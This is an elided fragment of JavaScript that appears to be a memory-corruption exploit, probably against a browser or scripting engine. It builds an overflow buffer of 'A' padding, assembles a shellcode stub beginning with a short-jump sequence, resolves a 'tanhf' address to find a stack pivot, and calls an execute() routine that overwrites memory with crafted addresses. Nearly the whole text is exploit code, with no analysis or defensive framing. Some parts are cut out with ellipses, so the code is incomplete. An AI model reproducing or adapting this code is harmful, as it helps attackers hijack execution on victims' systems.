...
function execute(oba, exec_param_2) {
    ovrw(crVa(0x81, addP(lVP, 0x60)) + crVa(0, addP(oba, 2 * (3000))) + exec_param_2, 0);
    typeof cV;
}
...
function main() {
    ...
    ThfA = gEx(MM, "tanhf");
    exec_param_1 = Array(3000 + 1).join('A');
    exec_param_1 = exec_param_1 + Array(157).join('A') + a2s(NTCA);
    exec_param_1 = exec_param_1.substr(0, exec_param_1.length);
    exec_param_1 = o2a(exec_param_1);
    scS = "\u10EB";
    scS += a2s(LLA);
    scS += a2s(GPAA);
    ...
    sVA = o2a(sV);
    piv = fpiv(ThfA);
    exec_param_2 = mNTCD(JOSL, nSA, piv, scA, i2a(scS.length * 2), sVA);
    execute(exec_param_1, exec_param_2);
}
main();